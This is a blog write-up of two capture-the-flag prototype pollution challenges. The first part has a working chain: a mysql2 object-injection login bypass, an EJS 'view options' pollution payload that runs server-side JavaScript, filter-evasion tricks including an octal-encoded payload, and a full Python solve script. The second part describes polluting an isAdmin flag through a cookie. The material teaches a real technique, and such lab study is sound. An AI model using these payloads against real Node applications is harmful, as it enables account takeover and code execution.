---
title: (English) My Study on Prototype Pollution
date: 2026-3-28 13:19:33
top_img: /img/pp.png  
cover: /img/pp.png
categories:
  - Web Exploit
  - Writeup CTF
toc: true
---

# Overview of Prototype Pollution
> **Prototype pollution** vulnerabilities typically arise when user input is used to set properties of
existing objects.This vuln is kind of long thery so I will not discuss in this blog. You can learn more about this vulnerable [here](https://portswigger.net/web-security/learning-paths/prototype-pollution)

But after complete that learning-path, I start do some CTF challenge and writeup it here.

# [pr0t0typ3 p011ut10n ](https://dreamhack.io/wargame/challenges/1549)
![image](https://cdn.h26v.io.vn/1774667102974-ce9f5588c13ec666.png)

## Overview

The Exploit chain for this challenge have two step:

1. **Bypass login as admin** through a type-confusion / query-formatting issue in `/auth/login`.
2. **Exploit prototype pollution** in `/admin` to poison `Object.prototype`, then abuse **EJS rendering options** to execute server-side JavaScript and overwrite the template with the flag.



---

## Routes

From the app entrypoint

* `/auth/*` is public
* `/admin/*` requires JWT auth
* `/guest/*` requires JWT auth


---

## 1. Admin login bypass

>Look at this login function

`/auth/login` :
``` ts 
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: 'Invalid input' });
    }
  
    const db = await getDB();
  
    const [rows, fields]: [User[], FieldPacket[]] = await db.query(
      'SELECT * FROM users WHERE username = ? and password = ? LIMIT 1',
      [username, password],
    );
```

The function above look normal at first sight but 

after learning from this [security blog](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)

Notice that 
* no `typeof username === 'string'`
* no `typeof password === 'string'`

That mean we can input an object to login function, and mysql2 will parse it differently that we can abuse to bypass login 


### The trick
Older MySQL escaping behavior used by vulnerable `mysql/mysql2` stacks could parse object values into SQL fragments rather than treating them as literal strings. The modern replacement project explicitly documents that this behavior could let objects manipulate query structure, and that MySQL2 only switched to the safer default in version `3.17.0`; this challenge uses `mysql2 3.11.3`. 

So if we input:
```json
{
  "username": "admin",
  "password": { "password": 1 }
}
```

The query become 
```sql
SELECT * FROM users
WHERE username = 'admin'
  AND password = `password` = 1
LIMIT 1
```
For the admin row, it compare ```password = `password` ```  is `TRUE` and then `TRUE=1`, so the predicate succeeds and the query get back the admin row.

**-->  Login as ADMIN** . We have a valid **admin token**.

---

## 2. Prototype pollution in `clone()`

The admin route does:

```ts
const data = clone(req.body);
return res.json(data);
```

The `clone()` implementation is:

```ts
function isObject(obj: any) {
  return typeof obj === 'function' || typeof obj === 'object';
}

export function clone(target: any) {
  const d = {};
  const visited = new WeakSet();

  function merge(target: any, source: any) {
    if (visited.has(source)) {
      return target;
    }

    visited.add(source);
      
// Notice in this code partern
    for (let key in source) {
      if (isObject(target[key]) && isObject(source[key])) {
        merge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
    return target;
  }

  return merge(d, target);
}
```

This is the classic recursive merge code patern that lead to prototype pollution in javascript:
* it uses `for...in`
* it allows special keys like `constructor` and `prototype`
* it recursively merges into existing properties


> We found the *source*, now we look for a *sink*?

The challenge uses `ejs 3.1.10` to render template. EJS is a good *sink* that we can abuse to [leverage Prototype Pollution to RCE](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

>When Express renders a template with EJS, EJS’s `renderFile()` has a special Express compatibility path: if `data.settings['view options']` exists, EJS shallow-copies those values into the render options. 

### The important EJS options

In EJS 3.1.10:

* `options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML`
* and when `opts.client` is true, EJS prepends the source with:

```js
escapeFn = escapeFn || <escapeFunction.toString()>;
```

before compiling it into a new function.

So `escapeFunction` is not merely stored as data. Under `client: true`, its source text is inserted into generated JavaScript and compiled. That gives us **server-side JavaScript execution during template compilation**

As `opts.client` and `opts.escapeFunction` aren't set by default. Our payload Prototype Pollution can set:
```js
{
  client: true,
  escapeFunction: "Arbitrary Javascript "
}
```

Our final payload will look like:

```json
{
  "constructor": {
    "prototype": {
      "view options": {
        "client": true,
        "escapeFunction": "..."
      }
    }
  }
}
```
## 3. Bypass blacklist:

The admin POST route filter these bad input:

```ts
const body = JSON.stringify(req.body).toLowerCase();

const keywords = [
  'flag', 'app', '+', ' ', 'join', '!', '[', ']', '$', '_', '`',
  'global', 'this', 'return', 'fs', 'child', 'eval', 'object',
  'buffer', 'from', 'atob', 'btoa', '\\x', '\\u', '%'
];
```

It still allow the keys that we need to build a RCE payload:

* `constructor`
* `prototype`
* `view options`
* `client`
* `escapeFunction`

And there are so many technique we could use to avoids banned words like: concat strings , octal escape or Unicode normalize

```js
//concat strings
(/f/.source).concat(/s/.source)      // => "fs"
(/fla/.source).concat(/g/.source)// => "flag"

//unicode normalize
'ﬂag'.toUpperCase().toLowerCase() === 'flag' // true '

//octal escape
"''.at.constructor('\\160\\162\\157\\143\\145\\163\\163\\56\\147\\145\\164\\102\\165\\151\\154\\164\\151\\156\\115\\157\\144\\165\\154\\145\\50\\47\\146\\163\\47\\51\\56\\167\\162\\151\\164\\145\\106\\151\\154\\145\\123\\171\\156\\143\\50\\47\\166\\151\\145\\167\\163\\57\\141\\144\\155\\151\\156\\56\\145\\152\\163\\47\\54\\160\\162\\157\\143\\145\\163\\163\\56\\147\\145\\164\\102\\165\\151\\154\\164\\151\\156\\115\\157\\144\\165\\154\\145\\50\\47\\146\\163\\47\\51\\56\\162\\145\\141\\144\\106\\151\\154\\145\\123\\171\\156\\143\\50\\47\\146\\154\\141\\147\\47\\51\\51')()"
```

## 4. The final exploit payload:

My prototype pollution request is:

```json
{
  "constructor": {
    "prototype": {
      "view options": {
        "client": true,
        "escapeFunction": "process.getBuiltinModule((/f/.source).concat(/s/.source)).writeFileSync('views/admin.ejs',process.getBuiltinModule((/f/.source).concat(/s/.source)).readFileSync((/fla/.source).concat(/g/.source)))"
      }
    }
  }
}
```
### What this code does

At EJS compile time, it executes:

1. `process.getBuiltinModule("fs")`
2. `readFileSync("flag")`
3. `writeFileSync("views/admin.ejs", <flag bytes>)`

So this payload overwrites the admin template with the flag contents.

---

## 5. Full exploitation flow
### Step 1: Get admin JWT

```http
POST /auth/login
Content-Type: application/json

{"username":"admin","password":{"password":1}}
```

Response:

```json
{"token":"<admin_jwt>"}
```

### Step 2: Pollute `Object.prototype`

```http
POST /admin
Authorization: Bearer <admin_jwt>
Content-Type: application/json

{
  "constructor": {
    "prototype": {
      "view options": {
        "client": true,
        "escapeFunction": "process.getBuiltinModule((/f/.source).concat(/s/.source)).writeFileSync('views/admin.ejs',process.getBuiltinModule((/f/.source).concat(/s/.source)).readFileSync((/fla/.source).concat(/g/.source)))"
      }
    }
  }
}
```

### Step 3: Trigger overwrite

```http
GET /admin
Authorization: Bearer <admin_jwt>
```

This runs the gadget and rewrites `views/admin.ejs`.

### Step 4: Read flag

```http
GET /admin
Authorization: Bearer <admin_jwt>
```

The response body is now the flag.

##

```
#!/usr/bin/env python3
import argparse
import requests
import sys


def log(msg: str):
    print(f"[*] {msg}")


def fail(msg: str):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(1)


def login_as_admin(session: requests.Session, base_url: str) -> str:
    # MySQL2 formats plain objects in placeholders as SQL fragments like:
    #   password = `password` = 1
    # so this becomes:
    #   SELECT * FROM users WHERE username = 'admin' AND password = `password` = 1 LIMIT 1
    # and the second predicate is true for any non-NULL row because (password = password) = 1.
    payload = {
        "username": "admin",
        "password": {"password": 1},
    }
    r = session.post(f"{base_url}/auth/login", json=payload, timeout=15)
    if r.status_code != 200:
        fail(f"admin login bypass failed: {r.status_code} {r.text}")
    token = r.json().get("token")
    if not token:
        fail(f"no token returned: {r.text}")
    log("got admin token")
    return token


def pollute_ejs(session: requests.Session, base_url: str, token: str) -> None:
    # Pollute Object.prototype['view options'] so EJS treats it as Express view options.
    # The payload avoids the route blacklist by building 'fs' and 'flag' at runtime.
    payload = {
        "constructor": {
            "prototype": {
                "view options": {
                    "client": True,
                    "escapeFunction": (
                        "process.getBuiltinModule((/f/.source).concat(/s/.source))"
                        ".writeFileSync('views/admin.ejs',"
                        "process.getBuiltinModule((/f/.source).concat(/s/.source))"
                        ".readFileSync((/fla/.source).concat(/g/.source)))"
                    ),
                }
            }
        }
    }

    headers = {"Authorization": f"Bearer {token}"}
    r = session.post(f"{base_url}/admin", json=payload, headers=headers, timeout=15)
    if r.status_code != 200:
        fail(f"prototype pollution failed: {r.status_code} {r.text}")
    log("prototype pollution succeeded")


def trigger_and_read_flag(session: requests.Session, base_url: str, token: str) -> str:
    headers = {"Authorization": f"Bearer {token}"}

    # First render compiles the original template and overwrites views/admin.ejs with the flag.
    r1 = session.get(f"{base_url}/admin", headers=headers, timeout=15)
    if r1.status_code != 200:
        fail(f"first /admin render failed: {r1.status_code} {r1.text}")
    log("first /admin render triggered the EJS gadget")

    # Second render reads the now-overwritten template file, which contains only the flag.
    r2 = session.get(f"{base_url}/admin", headers=headers, timeout=15)
    if r2.status_code != 200:
        fail(f"second /admin render failed: {r2.status_code} {r2.text}")

    flag = r2.text.strip()
    return flag


def main():
    parser = argparse.ArgumentParser(description="Solve script for the pr0t0typ3 p011ut10n web challenge")
    parser.add_argument("url", help="Base URL, e.g. http://host:3000")
    parser.add_argument("--proxy", help="HTTP(S) proxy, e.g. http://127.0.0.1:8080")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    session = requests.Session()
    session.verify = not args.insecure
    session.headers.update({"User-Agent": "solve-script/1.0"})
    if args.proxy:
        session.proxies.update({"http": args.proxy, "https": args.proxy})

    token = login_as_admin(session, base_url)
    pollute_ejs(session, base_url, token)
    flag = trigger_and_read_flag(session, base_url, token)
    print(flag)


if __name__ == "__main__":
    main()
```


```
python3 ./solve.py --proxy http://127.0.0.1:8080 http://host3.dreamhack.games:17163/
[*] got admin token
[*] prototype pollution succeeded
[*] first /admin render triggered the EJS gadget
DH{pR0T0tYp3_p0lluT10n_<REDACTED>}
```




# [NodeJS - Prototype Pollution Bypass](https://www.root-me.org/en/Challenges/Web-Server/NodeJS-Prototype-Pollution-Bypass)
![image](https://cdn.h26v.io.vn/1775755138325-704f6bf8d4d643e2.png)

This is a root-me blackbox challenge. This challenge took me a lot of time cuz It's kind of guessing.

After login, we've got a dashboard with some description
![image](https://cdn.h26v.io.vn/1775755584756-18ec822e93a1ca81.png)

It said about "mypost button", plus it is a prototye pollution challenge. So i think i will have to workout with "create post function"    
![image](https://cdn.h26v.io.vn/1775756024321-31a43b4391228f72.png)

>I was try several way to pollute it but nothing work

![image](https://cdn.h26v.io.vn/1775756373135-1fbe365dc5bf31e6.png)

Another route of this challenge are /admin that throw 403- Unauthorized and said: "Involve reason : You are not an admin.", i guess our goal is to prototype pollution property isAdmin to become Admin and capture the flag.

Route /profile allow us to update our cookie `visibility` to `private` or `public`. Hmm, what does this use for ?
![image](https://cdn.h26v.io.vn/1775755902545-8f4971500270134e.png). 

I try desperatelly pollute every json form that i found in this application but nothing happen. I feel desperated and exhauted, that i gave up for around two week.

But a day, I found a brilliant idea:  the pollution target may be the visibility cookie !!

![image](https://cdn.h26v.io.vn/1775757754420-7133ceb3fc34b356.png)

I try this and use response cookie to get the flag !!

![image](https://hackmd.io/_uploads/Hk4UqDH3Zx.png)

>Magic

I guess in serverside:  /mypost writes something equivalent to 
`posts[visibility][title] = post`. With `visibility="__proto__"`, 
my request become `posts.__proto__.isAdmin = true`,
which pollutes Object.prototype and makes the admin check pass.
